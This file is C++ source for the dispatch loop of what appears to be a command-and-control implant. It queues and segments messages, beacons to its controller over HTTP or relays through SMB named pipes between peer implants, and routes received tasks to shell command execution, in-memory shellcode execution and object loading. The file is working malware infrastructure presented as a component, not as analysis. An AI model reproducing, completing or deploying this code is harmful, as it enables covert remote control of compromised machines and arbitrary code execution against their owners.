#include <include/dispatch.hpp>
using namespace Utils;
using namespace Stream;
using namespace Parser;
using namespace Clients;
using namespace Network::Smb;
using namespace Network::Http;
using namespace Memory::Execute;

namespace Dispatcher {

    VOID AddMessage(_stream *const out) {

        auto head = Ctx->transport.outbound_queue;

        if (!Ctx->transport.outbound_queue) {
            Ctx->transport.outbound_queue = out;
        }
        else {
            while (head->next) {
                head = head->next;
            }

            head->next = out;
        }
    }

    VOID RemoveMessage(const _stream *target) {

        _stream *prev = { };

        if (!Ctx->transport.outbound_queue || !target) {
            return;
        }

        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
            if (head == target) {
                if (prev) {
                    prev->next = head->next;
                }
                else {
                    Ctx->transport.outbound_queue = head->next;
                }

                DestroyStream(head);
                return;

            }

            prev = head;
        }
    }

    VOID MessageQueue(_stream *const msg) {

        _parser parser = { };
        _stream *queue = { };

        if (msg->length > MESSAGE_MAX) {
            QueueSegments(B_PTR(msg->buffer), msg->length);
        }
        else {
            CreateParser(&parser, B_PTR(msg->buffer), msg->length);

            queue            = CreateStream();
            queue->peer_id   = __builtin_bswap32(UnpackDword(&parser));
            queue->task_id   = __builtin_bswap32(UnpackDword(&parser));
            queue->msg_type  = __builtin_bswap32(UnpackDword(&parser));

            queue->length   = parser.Length;
            queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));

            x_memcpy(queue->buffer, parser.buffer, queue->length);
            AddMessage(queue);

            DestroyParser(&parser);
            DestroyStream(msg);
        }
    }

    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {

        _stream *queue      = { };
        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
        constexpr auto m_max    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;

        while (length > 0) {
            cb_seg  = length > m_max ? m_max : length;
            queue   = (_stream*) x_malloc(cb_seg + SEGMENT_HEADER_SIZE);

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            queue->peer_id    = peer_id;
            queue->task_id    = task_id;
            queue->msg_type   = TypeSegment;

            PackDword(queue, index);
            PackDword(queue, n_seg);
            PackDword(queue, cb_seg);
            PackBytes(queue, B_PTR(buffer) + offset, cb_seg);

            length -= cb_seg;
            offset += cb_seg;
            index++;

            AddMessage(queue);
        }
    }

    VOID PrepareEgress(_stream *out) {

        _parser parser = { };

        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
            if (head->buffer) {
                CreateParser(&parser, B_PTR(head->buffer), head->length);

                PackDword(out, head->peer_id);
                PackDword(out, head->task_id);
                PackDword(out, head->msg_type);

                if (ROOT_NODE) {
                    PackBytes(out, B_PTR(head->buffer), head->length);
                }
                else {
                    AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
                }
                break;
            }
        }

        DestroyParser(&parser);
    }

    VOID PrepareIngress(_stream *in) {

        if (in) {
            if (PeekPeerId(in) != Ctx->session.peer_id) {
                MessageQueue(in);
            }
            else {
                CommandDispatch(in);
            }
        }
        else {
            auto head = Ctx->transport.outbound_queue;
            while (head) {
                head->ready = FALSE;
                head = head->next;
            }
        }
    }

    BOOL DispatchRoutine() {

        _stream *out    = CreateStream();
        _stream *in     = { };

    retry:
        if (!Ctx->transport.outbound_queue) {
            if (ROOT_NODE) {
                MessageQueue(CreateStreamWithHeaders(TypeTasking));
                goto retry;
            }
            else {
                return true;
            }
        }

        PrepareEgress(out);

        if (ROOT_NODE) {
            if (!HttpCallback(out, &in)) {
                return false;
            }
        }
        else {
            if (!PipeSend(out) || !PipeReceive(&in)) {
                return false;
            }
        }

        DestroyStream(out);
        PrepareIngress(in);
        PushPeers();

        defer:
        return true;
    }

    VOID CommandDispatch (const _stream *const in) {

        _parser parser = { };

        CreateParser(&parser, B_PTR(in->buffer), in->length);
        UnpackDword(&parser);

        auto task_id = UnpackDword(&parser);
        x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));

        switch (UnpackDword(&parser)) {
            case TypeCheckin:   x_memset(&Ctx->session.checkin, true, sizeof(bool)); break;
            case TypeTasking:   ExecuteCommand(parser); break;
            case TypeExecute:   ExecuteShellcode(parser); break;
            case TypeObject:    LoadObject(parser); break;

            default:
                break;
        }

        DestroyParser(&parser);
    }
}
